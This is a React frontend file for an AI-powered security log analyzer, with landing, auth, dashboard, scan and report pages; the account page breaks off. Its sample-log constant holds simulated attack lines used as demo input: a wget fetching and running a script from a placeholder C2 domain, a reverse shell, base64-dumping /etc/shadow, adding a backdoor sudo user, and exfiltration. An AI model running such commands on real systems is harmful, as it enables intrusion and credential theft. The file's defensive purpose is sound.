/**
 * AI Threat Analyzer — Frontend (No Subscription)
 * Pages: Landing · Auth · Dashboard · NewScan · ScanReport · Account
 */

import { useState, useEffect, useRef } from 'react';
import { supabase, getToken } from './lib/supabase.js';

const API = import.meta.env.VITE_API_URL || '';

// ── Severity helpers ──────────────────────────────────────────
const SEV_COLOR = {
  CRITICAL:'text-red-400', HIGH:'text-orange-400', MEDIUM:'text-yellow-400', LOW:'text-green-400',
  critical:'text-red-400', high:'text-orange-400', medium:'text-yellow-400', low:'text-green-400',
};
const SEV_BG = {
  CRITICAL:'bg-red-900/30 border-red-700/40', HIGH:'bg-orange-900/30 border-orange-700/40',
  MEDIUM:'bg-yellow-900/30 border-yellow-700/40', LOW:'bg-green-900/30 border-green-700/40',
};

const MITRE_TACTICS = [
  'Reconnaissance','Resource Dev','Initial Access','Execution',
  'Persistence','Priv Escalation','Defense Evasion','Cred Access',
  'Discovery','Lateral Movement','Collection','C2','Exfiltration','Impact',
];

const SAMPLE_LOGS = `2024-01-15 02:14:33 FIREWALL DENY  src=185.220.101.47  dst=10.0.1.5   port=22   proto=TCP  count=847
2024-01-15 02:14:33 FIREWALL DENY  src=185.220.101.47  dst=10.0.1.5   port=3389 proto=TCP  count=312
2024-01-15 02:18:47 SSH     FAIL   src=185.220.101.47  user=admin     dst=10.0.1.5
2024-01-15 02:18:49 SSH     FAIL   src=185.220.101.47  user=root      dst=10.0.1.5
2024-01-15 02:19:22 SSH     SUCCESS src=185.220.101.47 user=deploy    dst=10.0.1.5 session=44291
2024-01-15 02:19:28 PROCESS pid=9934 user=deploy cmd="wget http://malware-c2.ru/stage2.sh -O /tmp/.hidden_update"
2024-01-15 02:19:28 DNS     QUERY  src=10.0.1.5  query=malware-c2.ru  type=A  response=91.108.4.14
2024-01-15 02:19:32 PROCESS pid=9945 user=deploy cmd="chmod +x /tmp/.hidden_update && /tmp/.hidden_update"
2024-01-15 02:19:33 SYSLOG  WARN   msg="Privilege escalation via CVE-2023-0386 — process gained root"
2024-01-15 02:19:35 NETWORK dst=91.108.4.14 src=10.0.1.5 port=4444 proto=TCP state=ESTABLISHED msg="Reverse shell"
2024-01-15 02:19:36 FILE    MODIFY path=/etc/crontab change="Added persistence entry"
2024-01-15 02:19:38 PROCESS user=root cmd="useradd -m -s /bin/bash -G sudo svc_backup"
2024-01-15 02:19:40 PROCESS user=root cmd="cat /etc/shadow | base64"
2024-01-15 02:20:03 SSH     SUCCESS src=10.0.1.5 user=ubuntu dst=10.0.1.12 msg="Lateral movement — stolen key"
2024-01-15 02:21:19 NETWORK dst=91.108.4.14 src=10.0.1.12 port=443 bytes=94732180 msg="90.3MB exfiltrated"`;

async function apiFetch(path, opts = {}) {
  const token = await getToken();
  const res = await fetch(`${API}${path}`, {
    headers: {
      'Content-Type': 'application/json',
      ...(token ? { Authorization: `Bearer ${token}` } : {}),
      ...(opts.headers || {}),
    },
    ...opts,
  });
  const data = await res.json();
  if (!res.ok) throw new Error(data.error || `HTTP ${res.status}`);
  return data;
}

// ══════════════════════════════════════════════════════════════
// SHARED COMPONENTS
// ══════════════════════════════════════════════════════════════

function SeverityBadge({ level, className = '' }) {
  const l = (level || '').toUpperCase();
  return (
    <span className={`px-2 py-0.5 rounded text-xs font-mono font-bold border ${SEV_BG[l] || 'bg-gray-800 border-gray-600'} ${SEV_COLOR[l] || 'text-gray-400'} ${className}`}>
      {l || 'UNKNOWN'}
    </span>
  );
}

function RiskGauge({ score }) {
  const circumference = 157;
  const fill = (score / 100) * circumference;
  const color = score >= 90 ? '#ef4444' : score >= 70 ? '#f97316' : score >= 40 ? '#eab308' : '#22c55e';
  const label = score >= 90 ? 'CRITICAL' : score >= 70 ? 'HIGH' : score >= 40 ? 'MEDIUM' : 'LOW';
  return (
    <div className="flex flex-col items-center gap-1">
      <svg viewBox="0 0 120 68" width="140">
        <path d="M12 60 A48 48 0 0 1 108 60" fill="none" stroke="#1f2937" strokeWidth="10" strokeLinecap="round" />
        <path d="M12 60 A48 48 0 0 1 108 60" fill="none" stroke={color} strokeWidth="10" strokeLinecap="round"
          strokeDasharray={`${fill} ${circumference}`}
          style={{ transition: 'stroke-dasharray 1.4s cubic-bezier(.4,0,.2,1)', filter: `drop-shadow(0 0 6px ${color})` }} />
        <text x="60" y="58" textAnchor="middle" fill={color} fontSize="22" fontWeight="bold" fontFamily="monospace">{score}</text>
        <text x="60" y="68" textAnchor="middle" fill="#64748b" fontSize="9" fontFamily="monospace">/100</text>
      </svg>
      <span className={`text-xs font-mono font-bold ${SEV_COLOR[label] || ''}`}>{label}</span>
    </div>
  );
}

function MitreMatrix({ mappings = [] }) {
  const byTactic = {};
  mappings.forEach(m => { if (!byTactic[m.tactic]) byTactic[m.tactic] = []; byTactic[m.tactic].push(m); });
  return (
    <div className="overflow-x-auto pb-2">
      <div className="flex gap-1 min-w-max">
        {MITRE_TACTICS.map(tactic => {
          const hits = byTactic[tactic] || [];
          const active = hits.length > 0;
          return (
            <div key={tactic} className="w-20 flex-shrink-0">
              <div className={`text-center p-1.5 rounded-t border-b-2 font-bold ${active ? 'bg-red-900/60 border-red-500 text-red-300' : 'bg-gray-900 border-gray-700 text-gray-600'}`}
                style={{ fontSize: '10px', lineHeight: '1.2' }}>{tactic}</div>
              <div className="bg-gray-900/50 rounded-b min-h-8 p-0.5 space-y-0.5">
                {hits.map((h, i) => (
                  <div key={i} title={`${h.name} — ${h.confidence}% confidence`}
                    className="text-center font-mono py-0.5 px-1 rounded cursor-help"
                    style={{ background: `rgba(239,68,68,${h.confidence/100*0.5+0.1})`, color:'#fca5a5', fontSize:'9px' }}>
                    {h.technique}
                  </div>
                ))}
              </div>
            </div>
          );
        })}
      </div>
    </div>
  );
}

function TerminalLoader({ onComplete }) {
  const lines = [
    '> Initialising threat analysis engine...',
    '> Loading MITRE ATT&CK v14 knowledge base...',
    '> Parsing input for IOC signatures...',
    '> Running behavioral pattern matching...',
    '> Mapping techniques to ATT&CK framework...',
    '> Scoring risk across attack surface...',
    '> Generating remediation playbook...',
    '> Analysis complete ✓',
  ];
  const [shown, setShown] = useState(0);
  useEffect(() => {
    if (shown < lines.length) {
      const t = setTimeout(() => setShown(s => s + 1), 300 + Math.random() * 250);
      return () => clearTimeout(t);
    } else { setTimeout(onComplete, 700); }
  }, [shown]);
  return (
    <div className="bg-gray-950 border border-gray-800 rounded-xl p-6 font-mono text-sm space-y-1.5 min-h-56">
      <div className="flex items-center gap-2 mb-4 pb-3 border-b border-gray-800">
        <div className="w-3 h-3 rounded-full bg-red-500" /><div className="w-3 h-3 rounded-full bg-yellow-500" /><div className="w-3 h-3 rounded-full bg-green-500" />
        <span className="text-gray-500 text-xs ml-2">threat-analyzer — analysis</span>
      </div>
      {lines.slice(0, shown).map((line, i) => (
        <div key={i} className={`${i === shown-1 ? 'text-green-400' : 'text-gray-400'} animate-fadeIn`}>{line}</div>
      ))}
      {shown < lines.length && <div className="text-green-400 cursor-blink" />}
    </div>
  );
}

function Toast({ message, type = 'info', onClose }) {
  useEffect(() => { const t = setTimeout(onClose, 4000); return () => clearTimeout(t); }, []);
  const colors = { info:'bg-blue-900 border-blue-600', success:'bg-green-900 border-green-600', error:'bg-red-900 border-red-600' };
  return (
    <div className={`fixed top-4 right-4 z-50 px-4 py-3 rounded-xl border ${colors[type]} text-white text-sm max-w-sm animate-fadeIn shadow-2xl`}>
      <div className="flex items-start gap-2">
        <span>{type==='success'?'✓':type==='error'?'✗':'ℹ'}</span>
        <span>{message}</span>
        <button onClick={onClose} className="ml-auto text-white/60 hover:text-white">×</button>
      </div>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// LANDING PAGE
// ══════════════════════════════════════════════════════════════
function LandingPage({ onLogin, onSignup }) {
  const features = [
    { icon:'🧠', title:'Claude AI Analysis', desc:'Powered by Claude — understands context, not just patterns.' },
    { icon:'🗺️', title:'MITRE ATT&CK v14', desc:'Automatic technique mapping across all 14 tactics.' },
    { icon:'🎯', title:'IOC Extraction', desc:'IPs, domains, hashes, files — pulled automatically.' },
    { icon:'📊', title:'Risk Scoring', desc:'0–100 risk score with severity classification.' },
    { icon:'🔧', title:'Remediation Playbook', desc:'Prioritised action steps ranked by urgency.' },
    { icon:'📅', title:'Attack Timeline', desc:'Chronological event reconstruction with MITRE context.' },
  ];
  return (
    <div className="min-h-screen bg-gray-950 text-white">
      <nav className="border-b border-gray-800/50 px-6 py-4 flex items-center justify-between sticky top-0 bg-gray-950/95 backdrop-blur z-40">
        <div className="flex items-center gap-2 font-black text-lg">
          <span>🛡</span><span>ThreatAnalyzer</span>
          <span className="text-xs font-mono bg-red-900/40 text-red-400 px-2 py-0.5 rounded border border-red-800/40">AI</span>
        </div>
        <div className="flex items-center gap-3">
          <button onClick={onLogin} className="text-gray-300 hover:text-white text-sm px-4 py-2 transition-colors">Sign In</button>
          <button onClick={onSignup} className="bg-red-600 hover:bg-red-500 text-white text-sm px-5 py-2 rounded-lg font-semibold transition-colors">Get Started Free</button>
        </div>
      </nav>

      <section className="relative overflow-hidden px-6 py-28 text-center bg-grid">
        <div className="absolute inset-0 bg-gradient-to-b from-transparent via-gray-950/50 to-gray-950 pointer-events-none" />
        <div className="relative max-w-3xl mx-auto">
          <div className="inline-flex items-center gap-2 bg-red-900/20 border border-red-800/30 rounded-full px-4 py-1.5 text-red-400 text-sm mb-8 font-mono">
            <span className="w-2 h-2 rounded-full bg-red-500 animate-pulse" />
            Powered by Claude · MITRE ATT&CK v14
          </div>
          <h1 className="text-5xl md:text-6xl font-black leading-tight mb-6">
            AI-Powered<br /><span className="text-red-500">Threat Analysis</span>
          </h1>
          <p className="text-gray-400 text-lg mb-10 max-w-xl mx-auto leading-relaxed">
            Paste logs or upload files. Get instant ATT&CK mapping, IOC extraction, risk scoring, and remediation playbooks — in seconds.
          </p>
          <div className="flex flex-col sm:flex-row items-center justify-center gap-4">
            <button onClick={onSignup} className="w-full sm:w-auto bg-red-600 hover:bg-red-500 text-white font-bold px-8 py-4 rounded-xl transition-all hover:scale-105">
              Get Started Free →
            </button>
            <button onClick={onLogin} className="w-full sm:w-auto bg-gray-800 hover:bg-gray-700 text-gray-200 font-semibold px-8 py-4 rounded-xl transition-colors">
              Sign In
            </button>
          </div>
          <p className="text-gray-600 text-xs mt-4">Free to use · No credit card required · Unlimited scans</p>
        </div>
      </section>

      <section className="border-y border-gray-800/50 px-6 py-8">
        <div className="max-w-4xl mx-auto grid grid-cols-2 md:grid-cols-4 gap-6 text-center">
          {[['14','MITRE Tactics'],['200+','Techniques Mapped'],['< 30s','Analysis Time'],['5 MB','Max Log Size']].map(([n,l]) => (
            <div key={l}><div className="text-3xl font-black text-red-400">{n}</div><div className="text-gray-500 text-sm mt-1">{l}</div></div>
          ))}
        </div>
      </section>

      <section className="px-6 py-20 max-w-5xl mx-auto">
        <h2 className="text-3xl font-black text-center mb-12">Everything you need to respond faster</h2>
        <div className="grid grid-cols-1 md:grid-cols-2 lg:grid-cols-3 gap-4">
          {features.map(f => (
            <div key={f.title} className="bg-gray-900/50 border border-gray-800 rounded-xl p-5 hover:border-gray-600 transition-colors">
              <div className="text-2xl mb-3">{f.icon}</div>
              <div className="font-bold mb-1">{f.title}</div>
              <div className="text-gray-500 text-sm">{f.desc}</div>
            </div>
          ))}
        </div>
      </section>

      <footer className="border-t border-gray-800 px-6 py-8 text-center text-gray-600 text-sm">
        <div className="mb-2">🛡 AI Threat Analyzer — Powered by Claude</div>
        <div>© {new Date().getFullYear()} All rights reserved.</div>
      </footer>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// AUTH PAGE
// ══════════════════════════════════════════════════════════════
function AuthPage({ mode = 'login', onSuccess, onSwitch }) {
  const [email, setEmail] = useState('');
  const [password, setPassword] = useState('');
  const [loading, setLoading] = useState(false);
  const [error, setError] = useState('');

  async function handleSubmit(e) {
    e.preventDefault();
    setLoading(true); setError('');
    try {
      let result;
      if (mode === 'login') {
        result = await supabase.auth.signInWithPassword({ email, password });
      } else {
        result = await supabase.auth.signUp({ email, password });
      }
      if (result.error) throw result.error;
      if (mode === 'signup' && !result.data.session) {
        setError('Account created! Check your email to confirm, then sign in.');
        return;
      }
      onSuccess(result.data.user);
    } catch (err) { setError(err.message); }
    finally { setLoading(false); }
  }

  return (
    <div className="min-h-screen bg-gray-950 flex items-center justify-center p-4">
      <div className="bg-gray-900 border border-gray-800 rounded-2xl p-8 w-full max-w-md">
        <div className="text-center mb-8">
          <div className="text-4xl mb-3">🛡</div>
          <h2 className="text-2xl font-black">{mode === 'login' ? 'Sign In' : 'Create Account'}</h2>
          <p className="text-gray-500 text-sm mt-1">AI Threat Analyzer</p>
        </div>
        <form onSubmit={handleSubmit} className="space-y-4">
          <div>
            <label className="block text-sm text-gray-400 mb-1">Email</label>
            <input type="email" value={email} onChange={e => setEmail(e.target.value)} required
              className="w-full bg-gray-800 border border-gray-700 rounded-lg px-4 py-2.5 text-white focus:border-blue-500 focus:outline-none"
              placeholder="you@company.com" />
          </div>
          <div>
            <label className="block text-sm text-gray-400 mb-1">Password</label>
            <input type="password" value={password} onChange={e => setPassword(e.target.value)} required
              className="w-full bg-gray-800 border border-gray-700 rounded-lg px-4 py-2.5 text-white focus:border-blue-500 focus:outline-none"
              placeholder="••••••••" minLength={6} />
          </div>
          {error && <p className={`text-sm p-3 rounded-lg ${error.includes('created') ? 'bg-green-900/30 text-green-400' : 'bg-red-900/30 text-red-400'}`}>{error}</p>}
          <button type="submit" disabled={loading}
            className="w-full bg-red-600 hover:bg-red-500 disabled:bg-gray-700 text-white font-bold py-3 rounded-xl transition-colors">
            {loading ? 'Please wait…' : mode === 'login' ? 'Sign In' : 'Create Account'}
          </button>
        </form>
        <p className="text-center text-sm text-gray-500 mt-6">
          {mode === 'login' ? "Don't have an account? " : 'Already have an account? '}
          <button onClick={onSwitch} className="text-blue-400 hover:text-blue-300 font-semibold">
            {mode === 'login' ? 'Sign Up Free' : 'Sign In'}
          </button>
        </p>
      </div>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// DASHBOARD
// ══════════════════════════════════════════════════════════════
function Dashboard({ user, onNewScan, onViewScan, onAccount }) {
  const [scans, setScans] = useState([]);
  const [loading, setLoading] = useState(true);

  useEffect(() => {
    apiFetch('/api/scans').then(d => { setScans(d.scans || []); setLoading(false); }).catch(() => setLoading(false));
  }, []);

  return (
    <div className="min-h-screen bg-gray-950">
      <header className="border-b border-gray-800 px-6 py-4 flex items-center justify-between sticky top-0 bg-gray-950/95 backdrop-blur z-30">
        <div className="flex items-center gap-2 font-black text-lg"><span>🛡</span><span>ThreatAnalyzer</span></div>
        <div className="flex items-center gap-3">
          <span className="text-gray-500 text-sm hidden sm:block">{user?.email}</span>
          <button onClick={onAccount} className="text-gray-400 hover:text-white text-sm transition-colors">Account</button>
          <button onClick={onNewScan} className="bg-red-600 hover:bg-red-500 text-white text-sm px-4 py-2 rounded-lg font-semibold transition-colors">
            + New Scan
          </button>
        </div>
      </header>

      <div className="max-w-5xl mx-auto px-6 py-8">
        <div className="grid grid-cols-2 md:grid-cols-4 gap-4 mb-8">
          {[
            ['Total Scans', scans.length],
            ['Critical', scans.filter(s => s.severity==='CRITICAL').length],
            ['High', scans.filter(s => s.severity==='HIGH').length],
            ['Avg Risk', scans.length ? Math.round(scans.reduce((a,s) => a+(s.risk_score||0),0)/scans.length) : 0],
          ].map(([label, val]) => (
            <div key={label} className="bg-gray-900 border border-gray-800 rounded-xl p-4 text-center">
              <div className="text-2xl font-black text-white">{val}</div>
              <div className="text-gray-500 text-sm mt-1">{label}</div>
            </div>
          ))}
        </div>

        <div className="bg-gray-900 border border-gray-800 rounded-xl overflow-hidden">
          <div className="px-6 py-4 border-b border-gray-800 flex items-center justify-between">
            <h2 className="font-bold">Recent Scans</h2>
            <button onClick={onNewScan} className="text-red-400 hover:text-red-300 text-sm font-semibold transition-colors">+ Analyse New Threat</button>
          </div>
          {loading ? (
            <div className="p-12 text-center text-gray-600 font-mono">Loading…</div>
          ) : scans.length === 0 ? (
            <div className="p-12 text-center">
              <div className="text-4xl mb-4">📭</div>
              <div className="text-gray-500 mb-4">No scans yet. Paste logs to get started.</div>
              <button onClick={onNewScan} className="bg-red-600 hover:bg-red-500 text-white px-6 py-2.5 rounded-xl font-semibold transition-colors">Run First Analysis</button>
            </div>
          ) : (
            <table className="w-full">
              <thead>
                <tr className="text-xs text-gray-500 border-b border-gray-800">
                  <th className="text-left px-6 py-3">Date</th>
                  <th className="text-left px-6 py-3">Severity</th>
                  <th className="text-left px-6 py-3">Risk Score</th>
                  <th className="text-right px-6 py-3">Action</th>
                </tr>
              </thead>
              <tbody>
                {scans.map((scan, i) => (
                  <tr key={scan.id} className={`border-b border-gray-800/50 hover:bg-gray-800/30 transition-colors ${i%2===0?'':'bg-gray-900/30'}`}>
                    <td className="px-6 py-3 text-sm text-gray-400 font-mono">{new Date(scan.created_at).toLocaleString('en-IN')}</td>
                    <td className="px-6 py-3"><SeverityBadge level={scan.severity} /></td>
                    <td className="px-6 py-3"><span className={`font-mono font-bold ${SEV_COLOR[scan.severity]||'text-gray-400'}`}>{scan.risk_score}/100</span></td>
                    <td className="px-6 py-3 text-right">
                      <button onClick={() => onViewScan(scan.id)} className="text-blue-400 hover:text-blue-300 text-sm font-semibold transition-colors">View Report →</button>
                    </td>
                  </tr>
                ))}
              </tbody>
            </table>
          )}
        </div>
      </div>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// NEW SCAN PAGE
// ══════════════════════════════════════════════════════════════
function NewScanPage({ onComplete, onBack }) {
  const [input, setInput] = useState('');
  const [file, setFile] = useState(null);
  const [state, setState] = useState('idle');
  const [error, setError] = useState('');
  const fileRef = useRef();

  function handleAnalyse() {
    if (!input.trim() && !file) { setError('Please paste log data or upload a file.'); return; }
    setState('analysing'); setError('');
  }

  async function handleAnalysisComplete() {
    try {
      let result;
      if (file) {
        const formData = new FormData();
        formData.append('file', file);
        const token = await getToken();
        const res = await fetch(`${API}/api/analyze/file`, {
          method: 'POST',
          headers: token ? { Authorization: `Bearer ${token}` } : {},
          body: formData,
        });
        const data = await res.json();
        if (!res.ok) throw new Error(data.error);
        result = data.result;
      } else {
        const data = await apiFetch('/api/analyze', { method: 'POST', body: JSON.stringify({ input }) });
        result = data.result;
      }
      onComplete(result);
    } catch (err) {
      setState('error');
      setError(err.message || 'Analysis failed. Please try again.');
    }
  }

  return (
    <div className="min-h-screen bg-gray-950">
      <header className="border-b border-gray-800 px-6 py-4 flex items-center gap-4">
        <button onClick={onBack} className="text-gray-500 hover:text-white transition-colors">← Back</button>
        <h1 className="font-black text-lg">New Threat Analysis</h1>
      </header>
      <div className="max-w-3xl mx-auto px-6 py-10">
        {state === 'analysing' ? (
          <TerminalLoader onComplete={handleAnalysisComplete} />
        ) : (
          <div className="space-y-5">
            <div className="bg-gray-900 border border-gray-800 rounded-xl overflow-hidden">
              <div className="flex items-center justify-between px-4 py-3 border-b border-gray-800">
                <span className="text-sm font-semibold text-gray-300">Paste Security Logs / IOCs</span>
                <div className="flex gap-2">
                  <button onClick={() => { setInput(SAMPLE_LOGS); setFile(null); }} className="text-xs text-blue-400 hover:text-blue-300 font-mono transition-colors">Load sample →</button>
                  <button onClick={() => { setInput(''); setFile(null); }} className="text-xs text-gray-600 hover:text-gray-400 transition-colors">Clear</button>
                </div>
              </div>
              <textarea value={input} onChange={e => { setInput(e.target.value); setFile(null); }}
                className="w-full bg-transparent font-mono text-green-400 text-sm p-4 resize-none focus:outline-none min-h-64"
                placeholder="Paste firewall logs, SIEM events, IOC lists, incident notes…"
                spellCheck={false} />
            </div>

            <div className="border-2 border-dashed border-gray-700 rounded-xl p-6 text-center hover:border-gray-500 transition-colors cursor-pointer"
              onClick={() => fileRef.current?.click()}
              onDragOver={e => e.preventDefault()}
              onDrop={e => { e.preventDefault(); const f = e.dataTransfer.files[0]; if (f) { setFile(f); setInput(''); } }}>
              <input ref={fileRef} type="file" accept=".txt,.log,.json,.csv" className="hidden"
                onChange={e => { const f = e.target.files[0]; if (f) { setFile(f); setInput(''); } }} />
              {file ? (
                <div className="text-green-400 font-mono text-sm">📄 {file.name} ({(file.size/1024).toFixed(1)} KB)</div>
              ) : (
                <>
                  <div className="text-3xl mb-2">📂</div>
                  <div className="text-gray-400 text-sm">Drop a file here or <span className="text-blue-400">browse</span></div>
                  <div className="text-gray-600 text-xs mt-1">.txt · .log · .json · .csv · max 5 MB</div>
                </>
              )}
            </div>

            {(error || state === 'error') && (
              <div className="bg-red-900/20 border border-red-700/40 rounded-xl p-4 text-red-400 text-sm">{error}</div>
            )}

            <button onClick={handleAnalyse} disabled={!input.trim() && !file}
              className="w-full bg-red-600 hover:bg-red-500 disabled:bg-gray-800 disabled:text-gray-600 text-white font-bold py-4 rounded-xl transition-colors text-lg">
              🔍 Analyse Threat
            </button>
            <p className="text-gray-600 text-xs text-center">Raw input is never stored · Results are private to your account</p>
          </div>
        )}
      </div>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// SCAN REPORT
// ══════════════════════════════════════════════════════════════
function ScanReport({ result, onBack, onNewScan }) {
  const [tab, setTab] = useState('overview');
  if (!result) return null;

  return (
    <div className="min-h-screen bg-gray-950">
      <header className="border-b border-gray-800 px-6 py-4 sticky top-0 bg-gray-950/95 backdrop-blur z-30">
        <div className="flex items-center justify-between max-w-6xl mx-auto">
          <div className="flex items-center gap-4">
            <button onClick={onBack} className="text-gray-500 hover:text-white transition-colors">← Back</button>
            <div className="flex items-center gap-3">
              <h1 className="font-black text-lg">Threat Report</h1>
              <SeverityBadge level={result.severity} />
            </div>
          </div>
          <button onClick={onNewScan} className="bg-red-600 hover:bg-red-500 text-white text-sm px-4 py-2 rounded-lg font-semibold transition-colors">New Analysis</button>
        </div>
      </header>

      <div className="max-w-6xl mx-auto px-6 py-6">
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4 mb-6">
          <div className="bg-gray-900 border border-gray-800 rounded-xl p-5 flex items-center gap-5">
            <RiskGauge score={result.riskScore || 0} />
            <div>
              <div className="text-gray-500 text-xs mb-1">Risk Score</div>
              <div className="font-bold text-lg">{result.riskScore}/100</div>
              <div className="text-gray-400 text-sm mt-1">{result.affectedSystems?.length || 0} system(s) affected</div>
            </div>
          </div>
          <div className="md:col-span-2 bg-gray-900 border border-gray-800 rounded-xl p-5">
            <div className="text-gray-500 text-xs mb-2 font-mono">EXECUTIVE SUMMARY</div>
            <p className="text-gray-200 text-sm leading-relaxed">{result.summary}</p>
            <div className="flex flex-wrap gap-2 mt-3">
              <span className="text-xs bg-gray-800 border border-gray-700 px-2 py-1 rounded-full font-mono">{result.mitreMapping?.length||0} ATT&CK techniques</span>
              <span className="text-xs bg-gray-800 border border-gray-700 px-2 py-1 rounded-full font-mono">{result.iocs?.length||0} IOCs found</span>
              <span className="text-xs bg-gray-800 border border-gray-700 px-2 py-1 rounded-full font-mono">{result.timeline?.length||0} events</span>
            </div>
          </div>
        </div>

        <div className="flex gap-1 mb-6 bg-gray-900 border border-gray-800 rounded-xl p-1 overflow-x-auto">
          {['overview','timeline','mitre','iocs','remediation'].map(t => (
            <button key={t} onClick={() => setTab(t)}
              className={`flex-1 px-4 py-2 rounded-lg text-sm font-semibold capitalize transition-colors whitespace-nowrap ${tab===t?'bg-red-700 text-white':'text-gray-500 hover:text-gray-200'}`}>
              {t}
            </button>
          ))}
        </div>

        {tab === 'overview' && (
          <div className="space-y-4">
            <div className="bg-gray-900 border border-gray-800 rounded-xl p-5">
              <h3 className="font-bold mb-3 text-sm text-gray-400 uppercase tracking-wider">Affected Systems</h3>
              <div className="space-y-2">
                {(result.affectedSystems||[]).map((sys,i) => (
                  <div key={i} className="flex items-center justify-between bg-gray-800/50 rounded-lg px-4 py-2.5">
                    <span className="font-mono text-sm text-gray-200">{sys.host}</span>
                    <div className="flex items-center gap-3">
                      <span className="text-xs text-gray-500">{sys.status}</span>
                      <div className="w-20 h-1.5 bg-gray-700 rounded-full overflow-hidden">
                        <div className="h-full rounded-full" style={{ width:`${sys.risk}%`, background:sys.risk>80?'#ef4444':sys.risk>60?'#f97316':'#eab308' }} />
                      </div>
                      <span className={`font-mono text-xs font-bold ${sys.risk>80?'text-red-400':'text-orange-400'}`}>{sys.risk}%</span>
                    </div>
                  </div>
                ))}
              </div>
            </div>
            <div className="bg-gray-900 border border-gray-800 rounded-xl p-5">
              <h3 className="font-bold mb-4 text-sm text-gray-400 uppercase tracking-wider">MITRE ATT&CK Coverage</h3>
              <MitreMatrix mappings={result.mitreMapping||[]} />
            </div>
          </div>
        )}

        {tab === 'timeline' && (
          <div className="bg-gray-900 border border-gray-800 rounded-xl p-5">
            <h3 className="font-bold mb-4 text-sm text-gray-400 uppercase tracking-wider">Attack Timeline</h3>
            <div className="space-y-3">
              {(result.timeline||[]).map((event,i) => (
                <div key={i} className="flex gap-4">
                  <div className="flex flex-col items-center">
                    <div className={`w-2.5 h-2.5 rounded-full mt-1.5 flex-shrink-0 ${SEV_COLOR[event.severity]?.replace('text-','bg-')||'bg-gray-500'}`} />
                    {i < (result.timeline?.length||0)-1 && <div className="w-0.5 flex-1 bg-gray-800 mt-1" />}
                  </div>
                  <div className="pb-4 flex-1">
                    <div className="flex flex-wrap items-center gap-2 mb-1">
                      <span className="font-mono text-xs text-gray-500">{event.time}</span>
                      <SeverityBadge level={event.severity} />
                      {event.tactic && <span className="text-xs bg-blue-900/30 border border-blue-700/30 text-blue-400 px-2 py-0.5 rounded font-mono">{event.tactic}</span>}
                    </div>
                    <p className="text-sm text-gray-200">{event.event}</p>
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {tab === 'mitre' && (
          <div className="space-y-4">
            <div className="bg-gray-900 border border-gray-800 rounded-xl p-5">
              <h3 className="font-bold mb-4 text-sm text-gray-400 uppercase tracking-wider">ATT&CK Matrix</h3>
              <MitreMatrix mappings={result.mitreMapping||[]} />
            </div>
            <div className="grid grid-cols-1 md:grid-cols-2 gap-3">
              {(result.mitreMapping||[]).map((m,i) => (
                <div key={i} className="bg-gray-900 border border-gray-800 rounded-xl p-4">
                  <div className="flex items-start justify-between mb-1">
                    <span className="font-mono text-xs text-red-400 font-bold">{m.technique}</span>
                    <span className="text-xs text-gray-500">{m.confidence}% confidence</span>
                  </div>
                  <div className="font-semibold text-sm mb-1">{m.name}</div>
                  <div className="text-xs text-gray-500 font-mono">{m.tactic}</div>
                  <div className="mt-2 h-1 bg-gray-800 rounded-full overflow-hidden">
                    <div className="h-full bg-red-500 rounded-full" style={{ width:`${m.confidence}%` }} />
                  </div>
                </div>
              ))}
            </div>
          </div>
        )}

        {tab === 'iocs' && (
          <div className="bg-gray-900 border border-gray-800 rounded-xl overflow-hidden">
            <table className="w-full">
              <thead>
                <tr className="text-xs text-gray-500 border-b border-gray-800 text-left">
                  <th className="px-5 py-3">Type</th><th className="px-5 py-3">Indicator</th>
                  <th className="px-5 py-3">Threat</th><th className="px-5 py-3">Description</th>
                </tr>
              </thead>
              <tbody>
                {(result.iocs||[]).map((ioc,i) => (
                  <tr key={i} className={`border-b border-gray-800/50 ${i%2===0?'':'bg-gray-800/20'}`}>
                    <td className="px-5 py-3"><span className="text-xs bg-gray-800 border border-gray-700 px-2 py-0.5 rounded font-mono text-gray-300">{ioc.type}</span></td>
                    <td className="px-5 py-3 font-mono text-sm text-red-300 break-all">{ioc.value}</td>
                    <td className="px-5 py-3"><SeverityBadge level={ioc.threat} /></td>
                    <td className="px-5 py-3 text-sm text-gray-400">{ioc.description}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        )}

        {tab === 'remediation' && (
          <div className="space-y-3">
            {(result.remediation||[]).sort((a,b)=>a.priority-b.priority).map((step,i) => (
              <div key={i} className={`bg-gray-900 border rounded-xl p-5 ${step.urgent?'border-red-700/50':'border-gray-800'}`}>
                <div className="flex items-start gap-4">
                  <div className={`w-8 h-8 rounded-lg flex items-center justify-center text-sm font-black flex-shrink-0 ${step.urgent?'bg-red-700 text-white':'bg-gray-800 text-gray-300'}`}>
                    {step.priority}
                  </div>
                  <div className="flex-1">
                    <div className="flex flex-wrap items-center gap-2 mb-1">
                      <span className={`text-xs font-mono px-2 py-0.5 rounded border ${
                        step.category==='Containment'?'bg-red-900/30 border-red-700/30 text-red-400':
                        step.category==='Eradication'?'bg-orange-900/30 border-orange-700/30 text-orange-400':
                        step.category==='Recovery'?'bg-green-900/30 border-green-700/30 text-green-400':
                        'bg-blue-900/30 border-blue-700/30 text-blue-400'
                      }`}>{step.category}</span>
                      {step.urgent && <span className="text-xs bg-red-900/30 border border-red-700/30 text-red-400 px-2 py-0.5 rounded font-bold">URGENT</span>}
                    </div>
                    <p className="text-sm text-gray-200">{step.action}</p>
                  </div>
                </div>
              </div>
            ))}
          </div>
        )}
      </div>
    </div>
  );
}

// ══════════════════════════════════════════════════════════════
// ACCOUNT PAGE
// ══════════════════════════════════════════════════════════════
function AccountPage({ user, onBack, onSignOut }) {
  return (
    <div className="min-h-screen bg-gray-950">
      <header className="border-b border-gray-800 px-6 py-4 flex items-center gap-4">
        <button onClick={onBack} className="text-gray-500 hover:text-white transition-colors">← Back</button>
        <h1 className="font-black text-lg">Account</h1>
      </header>
      <div className="max-w-lg mx-auto px-6 py-10 space-y-6">
        <div className="bg-gray-900 border border-gray-800 rounded-xl p-6">
          <h2 className="font-bold mb-4">Profile</h2>
          <div className="space-y-3 text-sm">
            <div className="flex justify-between">
              <span className="text-gray-500">Email</span>
              <span className="font-mono text-gray-200">{user?.email}</span>
            </div>
            <div className="flex justify-between">
              <span className="text-gray-500">Member since</span>
              <span className="text-gray-400">{new Date(user?.created_at).toLocaleDateString('en-IN')}</span>
